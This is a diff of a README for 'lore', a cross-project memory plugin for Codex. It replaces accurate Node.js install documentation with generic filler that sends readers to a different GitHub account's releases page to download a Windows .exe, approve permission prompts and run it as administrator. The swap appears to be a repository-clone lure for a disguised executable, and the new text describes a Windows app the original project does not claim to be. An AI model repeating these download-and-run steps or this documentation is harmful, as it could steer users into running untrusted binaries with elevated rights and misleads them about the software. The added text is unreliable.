@@ -1,340 +1,207 @@
-# Lore — Cross-Project Memory for Codex
+# 🧠 lore - Keep rules and context in sync
 
-**A Codex plugin that gives your AI coding agent persistent, shared knowledge across every project and session.**
+[![Download lore](https://img.shields.io/badge/Download-lore-purple?style=for-the-badge)](https://github.com/evangeli9938/lore/releases)
 
-Lore watches your sessions, learns your patterns, and whispers the right context — naming conventions, architecture decisions, past choices — before each prompt. Automatically. You just install it and code.
+## 📦 What lore does
 
----
+lore helps you keep useful context in one place so it follows you from project to project. It stores rules, decisions, and notes that Codex can use when you work on different code bases.
 
-## Quick Start
+Use it when you want:
 
-```bash
-git clone https://github.com/yimwoo/lore.git /tmp/lore && bash /tmp/lore/install.sh
-```
+- the same project rules every time
+- saved decisions that do not get lost
+- context that carries across projects
+- less time repeating the same setup notes
+- a simple way to keep your work habits in one place
 
-Restart Codex, open **Local Plugins**, find **Lore**, and click **Install**.
+lore fits well if you switch between projects and want your past choices to stay easy to find.
 
-**That's it. Start coding. Lore starts learning.**
+## 💻 Windows download and setup
 
-> Already have a `CLAUDE.md`, `.cursorrules`, or `CONVENTIONS.md`? Run `lore init` in your project directory to import your existing rules in seconds. See [Cold Start](#cold-start-instant-setup).
+Visit this page to download:
 
----
+[https://github.com/evangeli9938/lore/releases](https://github.com/evangeli9938/lore/releases)
 
-## What Lore Does
+On the release page, look for the latest Windows file. It is usually named in a way that makes it easy to spot, such as a `.exe` file or a Windows zip file.
 
-Every time you start a new Codex session, your agent forgets everything — your naming conventions, your architecture decisions, why you chose library A over B. You re-explain the same context every session, every project, every day.
+### 🪟 Install on Windows
 
-Lore fixes this. It maintains persistent, cross-project memory and delivers it automatically:
+1. Open the release page.
+2. Download the Windows version.
+3. If the file is a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If you see a `.exe` file, double-click it to run lore.
+6. If Windows asks for permission, choose Yes.
+7. Keep the app in a folder that is easy to find, such as Downloads or Desktop.
 
-```text
-You type: "fix the billing migration"
+### ✅ First run
 
-Your agent sees (you don't have to):
-  [Lore]
-  - rule: DB columns use snake_case across all services.
-  - architecture: MySQL is the source of truth for billing state.
+After you open lore for the first time:
 
-Your agent responds:
-  "Since your project uses snake_case for DB columns, I'll name the
-   new field payment_status_code. And I'll write directly to MySQL
-   rather than going through the Redis cache."
-```
+1. Start the app.
+2. Let it create its local data folder.
+3. Add your first memory, rule, or decision.
+4. Check that the app can read and save your notes.
+5. Leave the app open while you work if you want fast access to your saved context
 
-No extra prompts. No copy-pasting context. Your agent just *knows*.
+## 🧩 How to use lore
 
----
+lore is built for simple, repeatable use. You do not need to manage it like a full project.
 
-## How Lore Learns
+### Add project rules
 
-Most users never write a single command. Here's what happens after you install:
+Store things like:
 
-**Sessions 1–2:** Lore observes silently. It maps your files, tools, and recurring patterns.
+- preferred file structure
+- naming rules
+- code style notes
+- what not to change
+- review steps before making edits
 
-**Session 3+:** Lore starts whispering. Before each prompt, it injects the most relevant context — rules, decisions, preferences — your agent picks up automatically.
+### Save decisions
 
-**Over time:** Lore drafts pending knowledge from recent turns, merges repeated patterns at session start, and surfaces what needs review in a lightweight SessionStart digest.
+Use lore to keep track of choices such as:
 
-Approved knowledge becomes permanent — shared across every future project, forever.
+- why a feature was added
+- what problem a fix solved
+- which approach the team rejected
+- what should stay the same in future work
 
-> **You always stay in control.** Lore never adds knowledge to your store without your explicit approval. Suggestions stay *pending* until you say so. See [You Control Everything](#you-control-everything).
+### Keep shared context
 
----
+You can keep notes that matter across projects, such as:
 
-## How It Works
+- your usual workflow
+- common setup steps
+- tools you use often
+- reminders for future tasks
 
-<p align="center">
-  <img src="docs/assets/lore-architecture.svg" alt="Lore architecture diagram showing two memory tiers and four delivery layers" width="680" />
-</p>
+## ⚙️ Basic workflow
 
-Lore keeps two tiers of memory:
+A simple way to use lore is:
 
-- **Project memory** — per-repo session context (active files, recent errors). Short-term working memory.
-- **Shared knowledge** — cross-project facts (domain rules, architecture decisions, preferences). Long-term memory that builds over time.
+1. Open the app.
+2. Add a rule for the project you are working on.
+3. Save any important decision before you move on.
+4. Reuse that context the next time you return.
+5. Update notes when the project changes
 
-Shared knowledge reaches your agent through three runtime delivery layers:
+This keeps your working memory in one place instead of spread across chat logs, sticky notes, and random files.
 
-| Layer | When | What |
-|---|---|---|
-| **SessionStart** | Once per session | Top 5–15 stable facts, biased toward your current workspace |
-| **Whisper** | Before each prompt | 0–4 adaptive bullets — most relevant shared knowledge, plus light high-confidence session nudges |
-| **MCP Recall** | On demand | Deep search across all shared knowledge |
+## 🖥️ System needs
 
-The **whisper system** is the key feature. It scores each knowledge entry against your current prompt using keyword overlap, tag matching, session affinity, and recent signals — then applies repetition decay so it never nags. If nothing is relevant, it says nothing. Your agent doesn't even know Lore is there.
+lore is made for modern Windows machines and should run well on common setups.
 
-For a deeper dive, see the [Design Overview](docs/design.md).
+### Recommended setup
 
----
+- Windows 10 or Windows 11
+- A current Intel, AMD, or ARM processor
+- At least 4 GB of memory
+- 200 MB of free disk space
+- Internet access for downloading the release file
 
-## Cold Start — Instant Setup
+### Good to have
 
-Already have convention files? Lore can import them immediately:
+- A mouse or touchpad for easy navigation
+- A screen with at least 1366 × 768 resolution
+- A cloud drive or backup tool if you want extra copy safety
 
-```bash
-lore init                    # Scan project, import found convention files interactively
-lore init --yes              # Auto-import all found files (scripted setup)
-```
+## 🔐 Privacy and local storage
 
-`lore init` scans for `.cursorrules`, `CLAUDE.md`, `.clinerules`, `.windsurfrules`, `AGENTS.md`, `CONVENTIONS.md`, and more. Each file is parsed into individual knowledge entries as `pending` suggestions for your review.
+lore is meant to keep your notes and project context close to you. That makes it useful for work that changes often.
 
-Or import specific files directly:
+You can use it to hold:
 
-```bash
-lore import CLAUDE.md                      # Import as pending entries
-lore import .cursorrules --approve-all     # Import and auto-approve
-lore import AGENTS.md --dry-run            # Preview without importing
-lore import CONVENTIONS.md --kind domain_rule --tag-prefix team
-```
+- private project notes
+- internal team rules
+- planning decisions
+- personal workflow details
 
----
+If you want to keep your work organized, store the app files in a folder you can back up with your normal Windows tools
 
-## Real-World Examples
+## 🗂️ What to save in lore
 
-**Cross-project recall** — You're in Project B debugging a billing service. Lore whispers that three weeks ago in Project A, you decided Postgres is the source of truth for billing state — not Redis. Without Lore, you'd spend 30 minutes rediscovering that.
+A good entry is short and clear. Try this format:
 
-**Language switching** — You switch between a TypeScript API and a Python ML pipeline. Lore remembers your naming conventions, preferred test frameworks, and architecture boundaries for each. It whispers the right conventions for whichever project you're in.
+- project name
+- rule or decision
+- reason for it
+- date or version
+- any follow-up step
 
-**Team onboarding** — A new teammate onboards using your shared Codex setup. Your Lore knowledge store acts as living documentation — every rule, decision, and preference your agent already knows.
+Example items you might save:
 
----
+- Always check shared config before editing files.
+- Keep UI text plain and short.
+- Use the same naming pattern for new modules.
+- Do not change the build step without review.
+- This feature was added to reduce duplicate work.
 
-## Shared Knowledge Kinds
+## 🔄 Keep your context current
 
-| Kind | What it captures | Example |
-|---|---|---|
-| `domain_rule` | Stable rules that rarely change | "All DB columns use snake_case" |
-| `architecture_fact` | Stack and platform assumptions | "PostgreSQL is source of truth" |
-| `decision_record` | Past decisions with rationale | "Chose Postgres over Mongo for ACID" |
-| `user_preference` | Coding style and tool choices | "Prefer named exports over default" |
-| `glossary_term` | Domain vocabulary | "SOR: Source of Record" |
+Old notes can cause confusion if they no longer match the project. Review them when:
 
----
+- a feature changes
+- a new team member joins
+- a release goes out
+- a build step changes
+- a rule no longer fits the code base
 
-## You Control Everything
+A short review once in a while keeps your memory set useful and easy to trust
 
-Lore **never** adds shared knowledge automatically. Every entry requires your explicit approval.
+## 🛠️ Common Windows fixes
 
-| Path | How it works |
-|---|---|
-| **SessionStart digest** | Lore tells you when pending suggestions exist and points you to `lore list-shared --status pending` |
-| **Inline correction** | Tell your agent "that rule is outdated" — it demotes the entry on the spot |
-| **CLI promotion** | Power users can promote knowledge directly via CLI (no approval step needed) |
-| **Demotion** | Soft-delete with full audit trail — nothing is ever hard-deleted |
+If lore does not start right away, try these steps:
 
-Your knowledge store is yours. Lore earns its place by being useful, not by taking over.
+1. Right-click the file and choose Run as administrator.
+2. Move the app folder out of a protected location.
+3. Check that Windows did not block the download.
+4. Make sure the file finished downloading.
+5. Re-download the latest release if the file looks damaged
+6. Restart your computer and try again
 
----
+If the app opens but does not save, check whether the folder is read-only and try a different location
 
-## MCP Recall Tools
+## 📁 Suggested folder setup
 
-Your agent can proactively search Lore for deeper context:
+To keep things simple, use a folder like this:
 
-| Tool | Returns |
-|---|---|
-| `lore.recall_rules` | Domain rules and glossary terms |
-| `lore.recall_architecture` | Architecture facts and platform assumptions |
-| `lore.recall_decisions` | Decision records with rationale |
-| `lore.search_knowledge` | Cross-kind freeform search |
-| `lore.dashboard` | Knowledge base overview (counts, tags, health) |
+- `Documents\lore`
+- `Desktop\lore`
+- `Downloads\lore`
 
-Bundled with the plugin install — no separate MCP configuration needed.
+Keep the app and its data in one place if possible. That makes it easier to back up and move later
 
----
+## 🧭 Short first-time checklist
 
-## Managing Knowledge
+1. Download lore from the release page.
+2. Open the Windows file.
+3. Finish setup or extract the archive.
+4. Launch the app.
+5. Add one rule and one decision.
+6. Close and reopen the app to confirm it saved your data.
+7. Use it during your next project session
 
-Most users start with `lore init` and let Lore learn on its own after that. For direct control, the CLI provides full management:
+## 📚 Helpful ways to think about lore
 
-### Import existing conventions
+Think of lore as a memory shelf for your work. It does not replace your code editor or file system. It gives you one place for the things you want to remember across projects.
 
-```bash
-lore init                                   # Scan project + import interactively
-lore import CLAUDE.md                       # Import a specific file
-lore import .cursorrules --approve-all      # Import and auto-approve
-```
+That includes:
 
-### Promote a rule manually
+- project habits
+- team rules
+- working choices
+- context that you do not want to rewrite
+- notes that help you keep pace from one task to the next
 
-```bash
-lore promote \
-  --kind domain_rule \
-  --title "Use snake_case for DB columns" \
-  --content "All database columns must use snake_case naming across services and migrations." \
-  --tags "naming,database"
-```
+## 🧪 Best results
 
-### See what Lore knows
+To get the most from lore:
 
-```bash
-lore list-shared                            # All entries
-lore list-shared --tag database             # Filter by tag
-lore list-shared --stale                    # Entries not seen in 60+ days
-lore list-shared --contradictions           # Entries with conflicts
-lore dashboard                              # Full knowledge base overview
-```
+- write short notes
+- keep one idea per entry
+- remove old items you no longer use
+- use the same labels each time
+- review notes before starting a new task
 
-### Resolve conflicts
-
-When Lore detects contradictory rules, it surfaces them at session start:
-
-```bash
-lore resolve <idA> <idB> --keep <id>        # Keep one, demote other
-lore resolve <idA> <idB> --scope <id> --project api  # Make one project-specific
-lore resolve <idA> <idB> --merge            # Combine into one entry
-lore history <id>                           # Trace supersession chain
-```
-
-### Remove outdated knowledge
-
-```bash
-lore demote <entry-id> --reason "migrated to camelCase"
-```
-
-> The `lore` CLI is globally available after running `install.sh` (via `npm link`). If you installed manually, run `npm link` from `~/.codex/plugins/lore-source/` to register the command.
-
----
-
-## Installation
-
-**Prerequisites:** Node.js 18+, npm
-
-```bash
-git clone https://github.com/yimwoo/lore.git /tmp/lore && bash /tmp/lore/install.sh
-```
-
-This clones Lore to `~/.codex/plugins/lore-source/`, runs `npm install`, links the `lore` CLI globally (via `npm link`), registers a marketplace entry in `~/.agents/plugins/marketplace.json`, and refreshes Codex's local plugin cache.
-
-### For Contributors
-
-Use `--local` to point the marketplace at your working copy:
-
-```bash
-bash install.sh --local
-```
-
-### Manual Installation
-
-```bash
-git clone https://github.com/yimwoo/lore.git ~/.codex/plugins/lore-source
-cd ~/.codex/plugins/lore-source
-npm install
-npm link          # makes `lore` available on your PATH
-```
-
-Then add a marketplace entry to `~/.agents/plugins/marketplace.json`:
-
-```json
-{
-  "name": "lore",
-  "source": { "source": "local", "path": "~/.codex/plugins/lore-source" },
-  "policy": { "installation": "AVAILABLE" },
-  "category": "Productivity"
-}
-```
-
-Restart Codex after installing.
-
-### Hooks
-
-| Hook | Purpose |
-|---|---|
-| `SessionStart` | Runs bounded consolidation, injects shared knowledge, initializes whisper state |
-| `UserPromptSubmit` | Whispers relevant shared knowledge before each prompt |
-| `Stop` (async) | Updates session context and drafts candidate knowledge after each turn |
-
-Hooks are auto-discovered from `.codex/hooks.json` in your repo. For global use, copy to `~/.codex/hooks.json`.
-
-### Storage
-
-All data lives locally on your machine:
-
-```text
-~/.lore/
-  shared.json              Shared knowledge entries
-  approval-ledger.json     Append-only audit trail
-  conflicts.json           Detected knowledge conflicts
-  observations/            Per-session observation logs
-  drafts/                  Per-session extracted draft candidates
-  consolidation-state.json SessionStart consolidation watermark
-  whisper-sessions/        Per-session whisper state
-```
-
-Every state change writes to the ledger first — crash-safe, nothing ever hard-deleted.
-
-### Updating
-
-```bash
-bash ~/.codex/plugins/lore-source/install.sh
-```
-
----
-
-## Development
-
-```bash
-npm test            # 624 tests
-npm run test:watch  # watch mode
-npm run typecheck   # tsc --noEmit
-npm run demo        # simulated session
-```
-
-### Project Structure
-
-```text
-src/
-  core/               Memory store, hint engine, daemon, markdown parser, dashboard aggregator
-  plugin/             SessionStart, instruction template, whisper, stop observer
-  promotion/          Promote, demote, approve, draft store, consolidator, conflict detection
-  extraction/         LLM provider interfaces, signal classifier
-  mcp/                MCP recall tool handlers + dashboard tool
-  shared/             Types, validators, semantic normalizer
-  cli/                Init onboarding flow
-  ui/                 React sidecar component (experimental)
-tests/                Vitest coverage — 624 tests across 42 files
-```
-
----
-
-## Design
-
-See the [Design Overview](docs/design.md) for architecture diagrams, whisper scoring details, promotion workflow, and storage layout.
-
----
-
-## Uninstalling
-
-```bash
-rm -rf ~/.codex/plugins/lore-source     # remove plugin
-rm -rf ~/.lore                           # remove stored data (optional)
-```
-
-Edit `~/.agents/plugins/marketplace.json` to remove the Lore entry, then restart Codex.
-
----
-
-## Contributing
-
-Contributions are welcome. Please open an issue first to discuss what you'd like to change.
-
-## License
-
-MIT
+This keeps the app fast to scan and easy to trust when you need context in a hurry
